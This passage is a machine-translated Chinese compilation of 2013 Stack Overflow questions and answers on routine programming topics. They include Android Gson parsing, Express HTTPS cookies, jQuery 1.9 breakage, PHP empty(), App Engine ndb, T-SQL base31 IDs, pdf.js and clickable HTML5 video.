        progressDialog.setOnCancelListener(new CancelListener(task));       
    }

    private class CapitalsRetrieverAsyncTask extends AsyncTask<Void, Void, Void> {

        Response response;

        @Override
        protected Void doInBackground(Void... params) {
            String url = "http://192.168.1.3:8080/Dochadzka/jsp/Android/GSON.jsp";

            HttpGet getRequest = new HttpGet(url);

            try {
                DefaultHttpClient httpClient = new DefaultHttpClient();
                HttpResponse getResponse = httpClient.execute(getRequest);
                final int statusCode = getResponse.getStatusLine().getStatusCode();

                if (statusCode != HttpStatus.SC_OK) { 
                    Log.w(getClass().getSimpleName(), "Error " + statusCode + " for URL " + url); 
                    return null;
                }

                HttpEntity getResponseEntity = getResponse.getEntity();
                InputStream httpResponseStream = getResponseEntity.getContent();
                Reader inputStreamReader = new InputStreamReader(httpResponseStream);

                Gson gson = new Gson();
                this.response = gson.fromJson(inputStreamReader, Response.class);
            } 
            catch (IOException e) {
                getRequest.abort();
                Log.w(getClass().getSimpleName(), "Error for URL " + url, e);
            }

            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            super.onPostExecute(result);

            StringBuilder builder = new StringBuilder();
            for (Country country : this.response.data) {

                builder.append(String.format("<br>Country: <b>%s</b><br>Capital: <b>%s</b><br><br>", country.getCountry(), country.getCapital()));

            }

            capitalTextView.setText(Html.fromHtml(builder.toString()));
            progressDialog.cancel();
        }

    }

    private class CancelListener implements OnCancelListener {

        AsyncTask<?, ?, ?> cancellableTask;

        public CancelListener(AsyncTask<?, ?, ?> task) {
            cancellableTask = task;
        }

        @Override
        public void onCancel(DialogInterface dialog) {
            cancellableTask.cancel(true);
        }

    }

} 
```

响应.java：

```
public class Response {

    ArrayList<Country> data;

    public Response() {
        data = new ArrayList<Country>();
    }

} 
```

我的jsp文件是：

```
{"data":
   [
     {"country":"Angola", "capital": "Luanda"},
     {"country":"Botswana", "capital": "Gaborone"},
     {"country":"Democratic Republic of the Congo", "capital": "Kinshasa"},
     {"country":"Lesotho", "capital": "Maseru"},
     {"country":"Madagascar", "capital": "Antananarivo"},
     {"country":"Malawi", "capital": "Lilongwe"},
     {"country":"Mauritius", "capital": "Port Louis"},
     {"country":"Mozambique", "capital": "Maputo"},
     {"country":"Namibia", "capital": "Windhoek"},
     {"country":"South Africa", "capital": "Pretoria"},
     {"country":"Swaziland", "capital": "Lobamba"},
     {"country":"Tanzania", "capital": "Dodoma"},
     {"country":"Zambia", "capital": "Lusaka"},
     {"country":"Zimbabwe", "capital": "Harare"}   
   ]
 } 
```

这是错误日志：http: [//pastebin.com/K5Qjh6h4](http://pastebin.com/K5Qjh6h4)

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:11:11.667

`Caused by: java.lang.NoClassDefFoundError: com.google.gson.Gson`

GSON 没有与您的项目一起打包和部署。

有关如何将其添加到项目中的说明，请参阅[文档。](http://developer.android.com/guide/faq/commontasks.html#addexternallibrary)

# ios - 隔离应用程序功能使用的特定方法？

> ID：15533670
> 
> 赞同：0
> 
> 时间：2013-03-20T20:09:06.517
> 
> 标签：ios, jailbreak

我正在尝试掌握[Flex](http://www.idownloadblog.com/2013/01/14/flex/)（而不是 Adob​​e Flex），希望它能更容易地过渡到硬核越狱开发。

所以，目前，我正在为提醒应用程序制作一个相对简单的补丁，以始终显示提醒的所有选项，正如您在此处看到的，我设法通过覆盖类的返回值来做到这`-(BOOL) shouldDisplayEditItem:(id) withVisibility:(int)`一点`EXReminderEditor`：

![在此处输入图像描述](../Images/41a2b91f55bab0abad64c2e0416bc31b.png)

但是，我还想防止出现“少显示...”按钮，因为它现在不起作用，但我发现负责任的方法难以隔离。我知道我可能正在寻找具有布尔返回值的方法，但即使使用多个搜索过滤器（例如`-(BOOL)`、`show`等），我也找不到该按钮的方法。

考虑到这是可执行文件和库的列表，每个都包含大量的类和方法，简单地逐个查看是不可行的：

*   可执行文件
    *   提醒
*   图书馆
    *   帐号设定
    *   地址簿
    *   核心基金会
    *   核心图形
    *   核心位置
    *   核心文本
    *   事件套件
    *   EventKitUI
    *   基础
    *   图形服务
    *   libicucore.A.dylib
    *   libobjc.A.dylib
    *   libSystem.B.dylib
    *   石英芯
    *   跳板服务
    *   UIKit

我的最终目标是能够快速隔离应用程序用于某些事情的特定方法，那么有谁知道实现这一目标的相对简单的方法？

我希望有类似于 Chrome 的开发者工具的东西，但我知道这不太可能。那么，如果做不到这一点，有人可以就我可以使用的可能的命名方案/位置模式向我提供建议吗？

另外，有谁知道该按钮使用什么方法？:D

# node.js - 在 Express 中将登录用户重定向到 https？

> ID：15533671
> 
> 赞同：0
> 
> 时间：2013-03-20T20:09:20.353
> 
> 标签：node.js, express, passport.js

我正在使用带有用户名/密码策略的[PassportJS来验证我网站上的用户。](http://passportjs.org/)我已确保用户必须通过 HTTPS 登录，并且我已确保会话 cookie 仅通过 HTTPS 发送：

```
app.use(express.session({
    // ...
    cookie: { secure:true }
})); 
```

但是现在，如果有人登录（通过 HTTPS）然后通过 HTTP 返回网站，看起来他们没有登录，因为他们的浏览器没有发送 cookie。

我想将登录用户重定向到 HTTPS。

我认为我需要发布两个 cookie：一个带有会话详细信息（标记为`secure: true`），一个仅显示“您已登录”（标记为`secure: false`）。如果我通过 HTTP 看到第二个 cookie，我可以重定向到 HTTPS，并且将发送安全 cookie。Presto：登录用户被重定向到 HTTPS。

问题：如何在 Express 中执行此操作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-29T14:53:51.110

当有人通过 HTTPS 访问站点时添加`Strict-Transport-Security` [标头。](https://www.rfc-editor.org/rfc/rfc6797)这将导致他们的浏览器在下次访问该站点时自动将 HTTP 重写为 HTTPS。

```
app.use(function(req, res, next) {
    if (req.secure()) {
        res.header('Strict-Transport-Security', 'max-age=31536000');
    }

    next();
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-27T08:42:22.553

当用户登录成功后，设置一个cookie：

```
res.cookie('loggedin', '1', { secure : false /*, other options */ }); 
```

接下来，使用检查该 cookie 的中间件：

```
app.use(function(req, res, next) {
  if (req.cookie.loggedin === '1' && ! req.secure())
  {
    res.redirect(HTTPS_LOCATION);
  }
  else
  {
    next();
  }
}); 
```

的值`HTTPS_LOCATION`取决于您的设置，但您可能可以使用`req.path`.

# javascript - SoundCloud 自定义播放器在 FireFox 中不起作用？

> ID：15533676
> 
> 赞同：0
> 
> 时间：2013-03-20T20:09:37.510
> 
> 标签：javascript, soundcloud

我正在为这个人建立一个网站，他希望我安装 SoundCloud 自定义播放器。我这样做了，发现它在 Chrome 中运行良好，但在 FireFox（我在 19.0.2）或 IE（9.0.14）中不起作用。

这是网站： http: [//kimmy.lareveuse.net/](http://kimmy.lareveuse.net/)

我做错了什么吗？

我在这里得到了所有的安装信息：http: [//developers.soundcloud.com/docs/custom-player#](http://developers.soundcloud.com/docs/custom-player#)

该页面中的示例确实可以在 FireFox 上运行，但我注意到他们的示例使用的是以前版本的 jquery (1.4.2)，而我们现在使用的是 1.9.0 版本

任何建议，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:36:09.710

Always open you console when trying to debug JavaScript. For starters you have an error when trying to load some CSS file:

> GET [http://kimmy.lareveuse.net/css/sc-player.css](http://kimmy.lareveuse.net/css/sc-player.css) 404 (Not Found)

This will not solve the problem, but you should fix it either way.

Secondly you should set the encoding of document:

> The character encoding of the HTML document was not declared. The document will render with garbled text in some browser configurations if the document contains characters from outside the US-ASCII range. The character encoding of the page must to be declared in the document or in the transfer protocol.

Again this also will not solve the problem. The actual problem is that you are using jQuery 1.9 in [which `.browser` is removed](http://jquery.com/upgrade-guide/1.9/#jquery-browser-removed). And this is used by the custom soundcloud player to sniff the browser:

> TypeError: $.browser is undefined [Break On This Error] if ($.browser.msie) {

So either you need to upgrade the soundcloud player script (if a newer version is available) or you need to downgrade your jQuery version.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T15:30:08.567

这里有一个官方的“jQuery Migrate”插件：

[http://code.jquery.com/jquery-migrate-1.1.0.min.js](http://code.jquery.com/jquery-migrate-1.1.0.min.js)

您可以在正常的 jQuery 参考之后添加它。（通常不赞成，但可以快速解决。）如果做不到这一点，您需要摆脱 SC 的 $.browser.msie 用法并添加您自己的 IE 检测。

# php - 使用 cURL/php 获取页面，但它缺少一些东西

> ID：15533677
> 
> 赞同：1
> 
> 时间：2013-03-20T20:09:38.237
> 
> 标签：php, javascript, cookies, curl, get

我需要从外部网站（使用不同的域）提取数据。我试图检索的大部分数据不会显示，除非用户在元素上进行交互（点击），或者如果设置了 cookie。

我试图将 curl 与 PHP 一起使用，但我对其他选项持开放态度。是否可以发出可以在请求期间处理 javascript 的编程 GET 请求？

根据有关此问题的帖子 curl 可以传递 cookie，但不会将结果行为发回，因为它不使用 js 处理返回数据。

[通过 curl 设置 cookie](https://stackoverflow.com/questions/6007225/setting-cookie-through-curl)

任何其他建议都非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-29T18:23:51.220

据我所知，使用可以从面向公众的网页检索经过 js 处理后的 HTML 输出的框架来抓取数据并没有多大用处，因此已经放弃了它的进展。如果我找到一个允许轻松检索的框架，我将更新这篇文章。

# php - 在 == "" 上使用空

> ID：15533678
> 
> 赞同：-4
> 
> 时间：2013-03-20T20:09:38.940
> 
> 标签：php

我注意到，使用`if (empty($var)){`并不像大多数人想的那样有效。

而是使用`empty()`我一直在使用的 if`($Var == ""){`

因为如果文本框/输入有一个空格，它就不是空的。而 using`==""`不会注意到空格，所以如果有一个空格，并且只有一个空格，我的第二个例子更有效

这是php中的错误吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T20:15:19.943

来自 PHP 文档[`empty`](http://php.net/manual/en/function.empty.php)

> 以下内容被认为是空的：
> 
> ```
> "" (an empty string)
> 0 (0 as an integer)
> 0.0 (0 as a float)
> "0" (0 as a string)
> NULL
> FALSE
> array() (an empty array)
> $var; (a variable declared, but without a value) 
> ```

看起来您只是在测试是否有非空白字符，所以这应该有效：

```
 if (strlen(trim($var)) == 0) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:16:52.347

来自[function.empty](http://php.net/manual/en/function.empty.php)手册的页面。

> 以下内容被认为是空的：
> 
> ```
> "" (an empty string)
> 0 (0 as an integer)
> 0.0 (0 as a float)
> "0" (0 as a string)
> NULL
> FALSE
> array() (an empty array)
> $var; (a variable declared, but without a value) 
> ```

并`empty(" ")`返回`FALSE`。

此外，`" "`字符串与 ASCII 字符相同`0x20`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T20:26:41.157

这不是 PHP 中的错误。所有的语言都在一点一点地提高自己。PHP声称有许多功能，它们将来会贬值。这是否意味着......他们有错误？顺便说一句，我认为`is_null($var)`接近你所需要的。

编辑2：

empty(),is_null() 和 isset() 之间的区别有一个很好的链接

[http://mechiwiki.com/techmed/php/php-empty-is_null-and-isset-comparison](http://mechiwiki.com/techmed/php/php-empty-is_null-and-isset-comparison)

# python - 应用引擎 ndb。基于引用属性的查询模型

> ID：15533680
> 
> 赞同：0
> 
> 时间：2013-03-20T20:09:41.817
> 
> 标签：python, google-app-engine

我在尝试使用 AppEngine 框架中的 ndb 查询对象时遇到一些问题。我对 ndb 很陌生，我想我误解了一些重要的概念。

这是我所拥有的：

我有我的模型`Teacher`：

```
from webapp2_extras.appengine.auth.models import User

class Teacher(ndb.Model):
    user = ndb.StructuredProperty(User)
    ranking = ndb.FloatProperty(required=True) 
```

如您所见，用户模型来自 webapp2 框架。然后我尝试查询与某个用户关联的老师。我这样做：

```
def _findTeacher(self, user):
    t = Teacher.query(Teacher.user == user).fetch(1)
    if t:
        return t[0]
    else:
        return None 
```

作为该函数的参数来的用户获取方式如下：

```
user_session = self.auth.get_user_by_session()
user = self.auth.store.user_model.get_by_auth_token(user_session['user_id'], user_session['token'])[0] 
```

但是，我收到以下错误：

```
BadFilterError: invalid filter: Cannot query for non-empty repeated property auth_ids. 
```

我真的很想知道我的错误在哪里，并且使用 ndb 和 webapp2 auth 系统的应用程序示例也将非常有帮助。

谢谢你们

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T23:30:11.043

从新[开发银行属性](https://developers.google.com/appengine/docs/python/ndb/properties#structured)：

> 虽然 StructuredProperty 可以重复，并且 StructuredProperty 可以包含另一个 StructuredProperty，但请注意：如果一个结构属性包含另一个，则只能重复其中一个。

发生错误是因为 Teacher.User 是一个 StructuredProperty，其中包含 Teacher.User.auth_ids，它是一个重复的 StructuredProperty。

## 编辑（解决方案）：

我建议这样做：

```
class Teacher(ndb.Model):
    user = ndb.KeyProperty(User)
    ranking = ndb.FloatProperty(required=True) 
```

存储对用户的引用。对于您上面的示例，这将起作用。但是，这也意味着您无法查询用户的任何属性，例如`Teacher.User.name == 'bob'`.

你这样查询：

```
t = Teacher.query(Teacher.user == user.key).fetch(1) 
```

我希望这有帮助。

# sql - 在 SQL 函数中使用 Com+ (VBScript) 函数

> ID：15533681
> 
> 赞同：0
> 
> 时间：2013-03-20T20:09:54.707
> 
> 标签：sql, sql-server, sql-server-2008, tsql, vbscript

我通常使用此代码使用 DLL Com+ 组件/对象对字符串进行编码，我想知道如何以及是否可以以某种方式在 SQL 函数中完成这样的事情？

我知道如何编写 SQL 函数，但不涉及 Com+ 库中的对象，这可以实现吗？

这就是我在应用程序中编写代码的方式：

```
sMyKey = "1234567"
sStr = "Text to be encoded"

Set Crypt = server.CreateObject("aspCrypt.EasyCRYPT")
 Crypt.Algorithm = 162
 Crypt.Mode = cmCTS
 Crypt.Counter( -1 )
 Crypt.initKey( sMyKey )

 sEncodedString = Crypt.EncodeString( sStr , 1 )

Set Crypt = Nothing 
```

这将返回`sEncodedString`我将如何在 SQL 函数中编写此代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:28:03.027

好的，谷歌搜索一下发现有`sp_OACreate`.

请参阅[http://msdn.microsoft.com/en-us/library/ms189763.aspx](http://msdn.microsoft.com/en-us/library/ms189763.aspx)

# sql - SQL 以有序的方式组合 2 个结果集

> ID：15533686
> 
> 赞同：0
> 
> 时间：2013-03-20T20:10:11.003
> 
> 标签：sql

有没有办法将 2 个查询排序到一个结果集中？

更具体地说，如果我有 2 个查询：

```
select 'line',product, numeric_value from numbertable order by product;

select 'Total',product, sum(numeric_value) from numbertable group by product; 
```

有没有办法组合这两个查询，以便结果集如下所示：

```
 Type      Product      numeric_value

    line      item1        23
    line      item1        57
    line      item1        23
    Total     item1        103
    line      item5        20
    line      item5        50
    line      item5        60
    Total     item5        130
    ... 
```

基本上，我希望列出一个产品的所有项目记录，然后显示它们的总和，然后列出下一个产品的所有项目记录，等等。

有没有办法做到这一点，或者这是一项不可能完成的任务？谢谢 ：）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:21:23.443

在许多数据库中，您可以使用`rollup`. 但是，既然你已经走到了这一步：

```
select *
from ((select 'line' as which, product, numeric_value from numbertable
      ) union all
      (select 'Total', product, sum(numeric_value) from numbertable group by product
      )
     ) t
order by Product, which 
```

,`order by Product, which`汇集了所有产品线。“总计”是最后由于订购。

# javascript - 在 jQuery 中重建元素与大规模显示/隐藏

> ID：15533691
> 
> 赞同：1
> 
> 时间：2013-03-20T20:10:30.540
> 
> 标签：javascript, jquery, dom

我有一个分页的数据表，我想在客户端缓存它，我试图弄清楚如何最有效地切换页面。

这样做会更好：

A. 通过对 DOM 的一次修改来重建和替换表

```
var pageLength = 50;
var cache; //array of some objects from database

function changePage(index) {
    var $table = $("<table>");
    $.each(cache, function (i, row) {
        var $tr = $("<tr>");
        if (i < index || i > index + pageLength) $tr.hide();
        $tr.append($("<td>", { text: row.ID }));
        $tr.append($("<td>", { text: row.Name }));
        $table.append($tr);
    });
    $("#targetDiv").html($table);
} 
```

或者

B. 插入 DOM 后显示和隐藏行

```
function changePage(index) {
    var $table = $("#targetDiv table");
    $table.find("tr:visible").hide();
    $table.find("tr").each(function (i, row) {
        if (i > index && i < index + pageLength) $tr.show();
    });
} 
```

我按照第一个的思路写了一些东西，并在 Chrome vs IE8 中运行它，发现 IE 明显慢了很多，而 Chrome 没有问题。不幸的是，我们的标准仍然是 IE7，所以我正在尝试优化 IE7 中的 JS 引擎在性能方面比 IE8 更差的情况。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:19:50.153

我会做两者的结合。

在加载时，您将显示第一页（参考存储在某处的完整列表）。

当请求第二页时，您将使用第二页数据填充它并隐藏第一页。

当再次请求第二页时，它已经被填充，因此它将是一个隐藏/显示功能。

这最好由一个知道哪个页面是当前页面、可能有多少页面等的类来处理。然后，当您可以进行一些智能内存管理时，您可以清空与当前页面相距一定数量的页面.

**但我建议使用现有的解决方案**

有许多客户端分页插件，尤其是对于 jQuery。

*   [DataTables](http://www.datatables.net/)是我过去使用过的东西，虽然一开始有点困难，但它具有高度可扩展性。
*   这是google 引导我访问[的 jQuery 插件列表。](http://www.tripwiremagazine.com/2012/10/jquery-pagination-plugins.html)

我会采用现有的解决方案，而不是尝试在这里重新发明轮子。

# assembly - 汇编语言源格式化程序

> ID：15533696
> 
> 赞同：0
> 
> 时间：2013-03-20T20:10:54.053
> 
> 标签：assembly, code-formatting

汇编语言似乎有点过时了，所以我找不到美化器/源格式化工具来清理我继承的混乱。

有人对此有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:32:15.720

搜索`asm source beautifier`一下，有很多...也许emacs还可以通过其众多的编辑模式和`indent-region`宏来帮助您...

# c# - 如何在 SQL 中创建/映射 base31“身份”列

> ID：15533701
> 
> 赞同：6
> 
> 时间：2013-03-20T20:11:08.850
> 
> 标签：c#, asp.net, sql

这是我第一次在论坛上发布问题，因为我通常更喜欢自己研究并找到答案，但我是程序员，足以承认数据库编程是我的致命弱点。

我正在寻找一个 base31 身份列以在我的数据库中使用，或者从我正在阅读的内容中，将 MAP SQL 身份列映射到 Base32 列。

我正在尝试在 00000-ZZZZZ 的范围内创建唯一的 5 位字母数字序列。（例如 0BG85）

我意识到字母数字代码并不理想，因为最终您的序列会拼出许多业务不合适的单词，因此我将消除元音 (a,e,i,o,u)。因此Base31。这个项目的限制因素是我使用的是 Code39 条形码实现，它将我限制在 0-9 和 AZ（仅限大写字母）。

我对数据库编程的接触有限，我最初的想法是查询生成的最后一个 ID，然后通过 C# 类通过算法增加下一个 ID。我的直觉和我一直在阅读的所有内容都告诉我，这是执行任务的一种迟钝不雅的方式。

我的研究使我找到了这几个资源

[使用 SQL Server 自定义自动生成的序列](http://www.sqlteam.com/article/custom-auto-generated-sequences-with-sql-server)

[将任何整数转换为以 2 到 36 为基数的字符串](http://geekswithblogs.net/bbiales/archive/2009/05/04/131732.aspx)

我想知道我是否使用了第二个链接的功能

略微编辑

```
Declare @alldigits as varchar(31);
Set @alldigits='0123456789BCDFGHJKLMNPQRSTVWXYZ' 
```

并通过存储过程或触发器（以前从未使用过触发器）向其发送标识列值，这可以接受吗？我在正确的轨道上吗？

## **已找到答案，但不允许我（新用户）在 5 小时内发布我自己的答案**

```
 FUNCTION dbo.CreateBase31ID
    (
@val as BigInt,
@base as int
)
returns varchar(63)
as
Begin
/* From http://sqltips.wordpress.com/2009/01/12/tsql-function-to-convert-decimal-to-hex-octal-or-any-other-base/  */
/* blog text: 
SQL Tips by Namwar Rizvi
  Frequently I see the questions in newsgroups about a function to convert 
  integer value to other bases like base 2 (binary), base 8 (octal) and base 16(hex). 
  Following TSQL function, which was orginally mentioned by Itzik Ben-Gan 
  in his book Inside Microsoft SQL Server 2005:TSQL Querying, provides you the 
  ability to convert a given integer into any target base. 
  I have just updated the function with more meaningful names and added some 
  comments to clear the logic.
*/

  /* Check if value is valid and if we get a valid base (2 through 36) */
  If (@val<0) OR (@base < 2) OR (@base> 36) Return Null;

  /* variable to hold final answer */
  Declare @answer as varchar(63);

  /* Following variable contains all 
     possible alpha numeric letters for any valid base 
  */
  Declare @alldigits as varchar(31);
  Set @alldigits='0123456789BCDFGHJKLMNPQRSTVWXYZ'

  /* Set the initial value of 
     final answer as empty string 
  */
  Set @answer='';

  /* Loop while the source value remains greater than 0 */
  While @val>0
  Begin
    Set @answer=Substring(@alldigits,@val % @base + 1,1) + @answer;
    Set @val = @val / @base;
  End

  /* Return the final answer */
  return @answer;
End 
```

向函数发送标识列值时，此函数正常工作。它完美地映射到我手动计算的测试值。我要真诚地感谢 Namwar Rizvi 的原始代码示例和 Brian Biales（来自我之前帖子中的第二个链接）解释并真正分解了 Namwar 的原始功能。我的老板认为我是个天才，但实际上，如果没有互联网和乐于助人的程序员为我指路，我只不过是个门外汉。

我希望这可以帮助其他人。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-25T14:57:25.647

我知道您有解决方案，但您的脚本存在一些小问题：

*   为什么它返回一个 VARCHAR(63)，这个大小有什么特别之处？您在尝试返回 VARCHAR(MAX) 时会遇到问题，所以我想您需要知道最大的结果是什么？
*   您检查 2 到 36 之间的有效基数，但 32 到 36 之间的任何数字都会用完转换数字；
*   你只是真的想转换为基数 31 那么为什么要对基数进行参数化呢？

我重新格式化了一下，得到了这个：

```
FUNCTION BigIntToBase31Ish (
    @Value BIGINT)
RETURNS VARCHAR(255)
AS
BEGIN
    DECLARE @Result VARCHAR(255) = '';
    DECLARE @Base INT = 31;
    DECLARE @ConvertDigits VARCHAR(31) = '0123456789BCDFGHJKLMNPQRSTVWXYZ';

    --Is the integer value valid?
    IF @Value < 0
        RETURN NULL;

    --Convert the integer value to base 31
    WHILE @Value > 0
    BEGIN
        SELECT @Result = SUBSTRING(@ConvertDigits,@Value % @Base + 1, 1) + @Result;
        SELECT @Value = @Value / @Base;
    END;
    RETURN @Result;
END; 
```

# java - Intellij 无法编译 JSP- 错误：PWC6345

> ID：15533705
> 
> 赞同：2
> 
> 时间：2013-03-20T20:11:11.340
> 
> 标签：java, jsp, ide, intellij-idea

我在 INTELLIJ 中的 Web 应用程序有问题。我是 INTELLIJ 的新手，所以我真的不知道如何解决这个问题。其他 IDE 从来没有这样的问题。

当我尝试运行我的 Web 应用程序时，它会出现以下错误：

```
org.apache.jasper.JasperException: PWC6345: There is an error in invoking javac. A full JDK (not just JRE) is required 
```

选择了 JDK 并且 glassfish 正在工作。其他人也有同样的问题，有些人通过更改 glassfish 的配置文件来修复它。但这并没有解决我的问题。

有人真的知道我该如何解决这个问题并能够在 INTELLIJ 中运行我的 Web 应用程序吗？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T06:11:27.233

Glassfish 正在使用`JAVA_HOME`环境变量，并在此变量定义的 JDK 下启动。在您的系统上，此变量可能指向 JRE。您可以在系统设置中或直接在 IntelliJ IDEA 中更改它（对 Debug 重复相同的操作）：

![在此处输入图像描述](../Images/f5cbc51655a88432a56ffd247df60406.png)

# java - 如何获取有关“功能”标志警告的更多信息？

> ID：15533706
> 
> 赞同：24
> 
> 时间：2013-03-20T20:11:15.243
> 
> 标签：java, scala, playframework-2.0, sbt, scala-2.10

使用 Play2 编译应用程序时，有时会在我的终端上显示以下消息：

> [信息] 将 1 个 Scala 源代码编译到 ~/target/scala-2.10/classes...
> [警告] 有 1 个功能警告；使用 -feature 重新运行以获取详细信息
> [警告] 发现一个警告
> [成功] 1 秒内编译

如何获得有关这些警告的更多信息？它必须是 sbt 的一个选项，但我不知道在哪里搜索......

* * *

## 回答 #1

> 赞同：43
> 
> 时间：2013-03-20T22:02:44.950

要查看您需要在 sbt 构建定义文件中添加“功能”标志的确切消息：

```
scalacOptions ++= Seq("-feature") 
```

为什么？Scala 2.10 不仅引入了新特性，还重新调整了旧特性——一些最强大的 scala 特性被隐藏了，因为它们应该以重大的责任被使用：[有时它们被错误地使用](https://groups.google.com/forum/#!msg/scala-sips/W5CGmauii8A/ddXorbmJpJkJ)了。这就是[SIP-18](http://docs.scala-lang.org/sips/pending/modularizing-language-features.html)出现的原因。从现在开始，要访问动态、高级类型、存在类型和其他一些东西，您必须显式启用它们。

# html - pdf.js 与本地 pdf 文件

> ID：15533707
> 
> 赞同：20
> 
> 时间：2013-03-20T20:11:19.887
> 
> 标签：html, pdf, pdf.js

我正在尝试使用 pdf.js 库，只想在我的服务器上显示本地 pdf 文件，而不是示例提供的 pdf 文件。

```
<html>
<body>
  <canvas id="the-canvas" style="border:1px solid black"></canvas>

  <!-- Use latest PDF.js build from Github -->
  <script type="text/javascript" src="https://raw.github.com/mozilla/pdf.js/gh-pages/build/pdf.js"></script>

  <script type="text/javascript">
    //
    // NOTE:
    // Modifying the URL below to another server will likely *NOT* work. Because of browser
    // security restrictions, we have to use a file server with special headers
    // (CORS) - most servers don't support cross-origin browser requests.
    //
    var url = '/test.pdf';

    //
    // Disable workers to avoid yet another cross-origin issue (workers need the URL of
    // the script to be loaded, and dynamically loading a cross-origin script does
    // not work)
    //
    PDFJS.disableWorker = true;

    //
    // Asynchronous download PDF as an ArrayBuffer
    //
    PDFJS.getDocument(url).then(function getPdfHelloWorld(pdf) {
      //
      // Fetch the first page
      //
      pdf.getPage(1).then(function getPageHelloWorld(page) {
        var scale = 1.5;
        var viewport = page.getViewport(scale);

        //
        // Prepare canvas using PDF page dimensions
        //
        var canvas = document.getElementById('the-canvas');
        var context = canvas.getContext('2d');
        canvas.height = viewport.height;
        canvas.width = viewport.width;

        //
        // Render PDF page into canvas context
        //
        page.render({canvasContext: context, viewport: viewport});
      });
    });
  </script>

</body>
</html> 
```

所以我将那里的 pdf url 更改为我的本地 '/test.pdf' url。但是，这给了我一条消息，当它清楚地存在于我的根文件夹中时，它无法找到该文件。知道什么可能导致此错误吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-25T08:24:20.910

修改 pdfjs/web/viewer.js 文件并更改

```
var DEFAULT_URL = '<file path on your server>' 
```

当我尝试在我的本地系统上实现[http://mozilla.github.com/pdf.js/web/viewer.html上的演示时，这很有效](http://mozilla.github.com/pdf.js/web/viewer.html)

# javascript - 如何让用户点击我的 HTML5 视频屏幕并转到新窗口中的链接？

> ID：15533716
> 
> 赞同：2
> 
> 时间：2013-03-20T20:11:47.060
> 
> 标签：javascript, jquery, html, video, video-player

如何让用户点击我的 HTML5 视频屏幕并转到新窗口中的链接？我环顾四周，找不到太多文字。与您在 YouTube 等上获得的功能基本相似。用户点击视频并在新窗口中链接。

使用这样的代码：

```
<video width="320" height="240" controls>
  <source src="movie.mp4" type="video/mp4">
  <source src="movie.ogg" type="video/ogg">
  <source src="movie.webm" type="video/webm">
</video> 
```

我想它看起来像这样，但我无法让它工作：

```
<video width="320" height="240" controls>
  <source src="movie.mp4" type="video/mp4">
  <source src="movie.ogg" type="video/ogg">
  <source src="movie.webm" type="video/webm">
<a href='http://www.google.com'> test link</a>
</video> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:35:46.753

You could try this as well:

```
<video width="320" height="240" onclick="window.open('http://google.com')" controls>
    <source src="movie.mp4" type="video/mp4"/>
    <source src="movie.ogg" type="video/ogg"/>
    <source src="movie.webm" type="video/webm"/>
</video> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:18:21.323

如果我发现你的问题是正确的，这个解决方案可以帮助你

```
<a href="http://google.com" target="_blank">
    <video width="320" height="240" controls>
        <source src="movie.mp4" type="video/mp4" />
        <source src="movie.ogg" type="video/ogg" />
        <source src="movie.webm" type="video/webm" />
    </video>
    </a> 
```

[http://jsfiddle.net/bXrPL/](http://jsfiddle.net/bXrPL/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T20:25:34.643

这是一个工作示例：http: [//jsfiddle.net/ysttd/](http://jsfiddle.net/ysttd/)

`<a>`与其将标签粘贴在 内，不如将 和标签`<video>`包装在父元素内：`<a>``<video>`

```
<div class="videoContainer">
    <video width="320" height="240" controls>
      <source src="http://snapshot.opera.com/resources/BigBuckBunny.ogv" type="video/ogg">
    </video>
    <a href='http://www.google.com'> test link</a>
</div> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-20T20:28:08.497

理论上，您应该能够`<video>`在链接内部放置一个链接来实现这一点。

但是，由于您已指定`controls`视频是*交互式内容*，因此不允许这样做。

相反，您可以使用 JavaScript：

```
document.querySelector('video').addEventListener('click', function () {
    open("http://example.com", "_blank");
}); 
```

# lua - 为两步操作构建一个很棒的 3.5 配置

> ID：15533718
> 
> 赞同：1
> 
> 时间：2013-03-20T20:11:53.170
> 
> 标签：lua, keyboard-shortcuts, awesome-wm

不确定如何表达这一点，但我正在尝试构建一个 lua 方法，以便能够为一个操作提供两个关键命令

说`meta-r,4`Where I'd push meta`R`然后释放两个键并 push `4`，它会说，将客户端放在监视器上`4`，或类似的东西。

我一直无法为类似的东西找到好的谷歌参考资料，并且查看很棒的 AP​​I 我也没有看到任何东西。

编辑：一个例子是你如何改变屏幕中的窗口，一个推`Ctrl`+`A`然后`4`去第四个窗口。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T22:35:16.907

这些被称为模态键绑定。查看[此文档](http://awesome.naquadah.org/wiki/Modal_Keybindings)以创建模式。

# html - 如何在 IE 8 中使用 CSS 创建圆角？

> ID：15533721
> 
> 赞同：0
> 
> 时间：2013-03-20T20:12:11.930
> 
> 标签：html, css, internet-explorer-8, rounded-corners

如何在 IE 8 中使用 CSS 创建圆角？由于 CSS 规则`corner-radius`不起作用，有一种解决方案可以在 IE8（或 IE6 和 IE7）中使用 CSS 来创建圆角。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T20:12:11.930

